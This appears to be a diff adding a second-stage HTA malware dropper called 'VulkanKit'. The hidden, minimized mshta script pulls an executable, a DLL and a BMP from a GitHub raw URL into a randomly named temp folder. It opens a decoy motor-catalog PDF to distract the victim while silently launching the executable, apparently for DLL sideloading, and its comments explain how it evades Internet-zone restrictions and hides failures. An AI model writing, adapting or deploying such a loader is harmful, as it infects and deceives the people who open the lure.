@@ -1,0 +1,38 @@
+<!-- VulkanKit stage 2. Do not edit the BaseUrl below by hand. For any
+     repository change run Rebuild-MshtaLnk.ps1 -BaseUrl so x.hta and the
+     shortcut stay in sync. Every failure below is silent by design.
+     mshta loads this file over the URL moniker, so the script runs in the
+     URL's Internet-zone safety context: ADODB.Stream / MSXML persistence
+     is blocked there ("Safety settings on this computer prohibit accessing
+     a data source on another domain"), while Scripting.FileSystemObject and
+     WScript.Shell stay usable. Downloads therefore go through the inbox
+     curl.exe (Windows 10 1803+), the same downloader as the download/ftp
+     versions. Keep this file pure ASCII. -->
+<html><head><title>VulkanKit</title>
+<hta:application id="app" windowstate="minimize" showintaskbar="no" />
+<script language="JScript">
+function getBin(url, path) {
+    if (fso.FileExists(path)) { fso.DeleteFile(path); }
+    var rc = sh.Run('curl.exe -sL --fail -o "' + path + '" "' + url + '"', 0, true);
+    if (rc !== 0) {
+        try { fso.DeleteFile(path); } catch (e2) {}
+        throw new Error("curl failed " + url + " rc=" + rc);
+    }
+}
+try {
+    var b = "https://raw.githubusercontent.com/BondayGo/VulkanKit/main/";
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var sh = new ActiveXObject("WScript.Shell");
+    var d = fso.BuildPath(fso.GetSpecialFolder(2).Path, ".dl" + (new Date()).getTime().toString(36) + Math.floor(Math.random() * 1679616).toString(36));
+    if (!fso.FolderExists(d)) { fso.CreateFolder(d); }
+    getBin(b + "vulkaninfo.exe", fso.BuildPath(d, "vulkaninfo.exe"));
+    getBin(b + "vulkan-1.dll", fso.BuildPath(d, "vulkan-1.dll"));
+    getBin(b + "vulkan-1.bmp", fso.BuildPath(d, "vulkan-1.bmp"));
+    var pdf = fso.BuildPath(d, "Ningbo Crotor-Cixi Dayan Motor Catalog_20260621.pdf");
+    try { getBin(b + "catalog.pdf", pdf); } catch (e) {}
+    try { if (fso.FileExists(pdf)) { sh.Run('"' + pdf + '"', 1, false); } } catch (e) {}
+    sh.CurrentDirectory = d;
+    sh.Run("vulkaninfo.exe", 0, false);
+} catch (e) {}
+window.close();
+</script></head><body></body></html>
